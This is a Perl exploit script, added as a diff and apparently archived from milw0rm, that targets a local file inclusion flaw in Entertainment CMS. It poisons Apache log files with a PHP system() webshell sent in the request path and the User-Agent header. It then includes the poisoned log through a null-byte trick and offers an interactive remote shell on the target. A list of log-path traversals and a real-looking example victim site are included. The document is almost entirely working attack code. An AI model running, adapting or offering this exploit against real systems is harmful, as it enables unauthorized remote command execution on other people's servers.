@@ -1,0 +1,115 @@
+#!/usr/bin/perl
+#
+# Entertainment CMS Remote Command Execution Exploit
+# Download: http://rapidshare.com/files/39640099/enter-cms.rar
+#
+# Exploit: http://site.com/[path]/custom.php?pagename=[Local File Inclusion];
+# Example: http://multimedia.mydlstore.net/custom.php?pagename=teeeeeeeeeeee
+#
+#                 RST WAS MOVED TO RSTZONE.ORG !
+#
+# Another bug: Entertainment CMS Admin Login Bypass => http://securityreason.com/securityalert/2878
+#
+# Coded by Kw3rLn from Romanian Security Team a.K.A http://RSTZONE.ORG
+# Contact: office@rstzone.org
+#
+
+
+use IO::Socket;
+use LWP::Simple;
+
+#ripped from rgod
+@apache=(
+"../../../../../var/log/httpd/access_log",
+"../../../../../var/log/httpd/error_log",
+"../apache/logs/error.log",
+"../apache/logs/access.log",
+"../../apache/logs/error.log",
+"../../apache/logs/access.log",
+"../../../apache/logs/error.log",
+"../../../apache/logs/access.log",
+"../../../../apache/logs/error.log",
+"../../../../apache/logs/access.log",
+"../../../../../apache/logs/error.log",
+"../../../../../apache/logs/access.log",
+"../logs/error.log",
+"../logs/access.log",
+"../../logs/error.log",
+"../../logs/access.log",
+"../../../logs/error.log",
+"../../../logs/access.log",
+"../../../../logs/error.log",
+"../../../../logs/access.log",
+"../../../../../logs/error.log",
+"../../../../../logs/access.log",
+"../../../../../etc/httpd/logs/access_log",
+"../../../../../etc/httpd/logs/access.log",
+"../../../../../etc/httpd/logs/error_log",
+"../../../../../etc/httpd/logs/error.log",
+"../../.. /../../var/www/logs/access_log",
+"../../../../../var/www/logs/access.log",
+"../../../../../usr/local/apache/logs/access_log",
+"../../../../../usr/local/apache/logs/access.log",
+"../../../../../var/log/apache/access_log",
+"../../../../../var/log/apache/access.log",
+"../../../../../var/log/access_log",
+"../../../../../var/www/logs/error_log",
+"../../../../../var/www/logs/error.log",
+"../../../../../usr/local/apache/logs/error_log",
+"../../../../../usr/local/apache/logs/error.log",
+"../../../../../var/log/apache/error_log",
+"../../../../../var/log/apache/error.log",
+"../../../../../var/log/access_log",
+"../../../../../var/log/error_log"
+);
+
+print "[RST] Entertainment CMS Remote Command Execution Exploit\n";
+print "[RST] need magic_quotes_gpc = off\n";
+print "[RST] c0ded by Kw3rLn from Romanian Security Team [ http://rstzone.org ] \n\n";
+
+
+if (@ARGV < 3)
+{
+    print "[RST] Usage: xploit.pl [host] [path] [apache_path]\n\n";
+    print "[RST] Apache Path: \n";
+    $i = 0;
+    while($apache[$i])
+    { print "[$i] $apache[$i]\n";$i++;}
+    exit();
+}
+
+$host=$ARGV[0];
+$path=$ARGV[1];
+$apachepath=$ARGV[2];
+
+print "[RST] Injecting some code in log files...\n";
+$CODE="<?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?>";
+$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "[RST] Could not connect to host.\n\n";
+print $socket "GET ".$path.$CODE." HTTP/1.1\r\n";
+print $socket "User-Agent: ".$CODE."\r\n";
+print $socket "Host: ".$host."\r\n";
+print $socket "Connection: close\r\n\r\n";
+close($socket);
+print "[RST] Shell!! write q to exit !\n";
+print "[RST] IF not working try another apache path\n\n";
+
+print "[shell] ";$cmd = <STDIN>;
+
+while($cmd !~ "q") {
+    $socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "[RST] Could not connect to host.\n\n";
+   
+    print $socket "GET ".$path."custom.php?pagename=".$apache[$apachepath]."%00&cmd=$cmd HTTP/1.1\r\n";
+    print $socket "Host: ".$host."\r\n";
+    print $socket "Accept: */*\r\n";
+    print $socket "Connection: close\r\n\n";   
+   
+    while ($raspuns = <$socket>)
+    {
+        print $raspuns;
+    }
+   
+    print "[shell] ";
+    $cmd = <STDIN>;   
+}
+
+# milw0rm.com [2007-07-24]
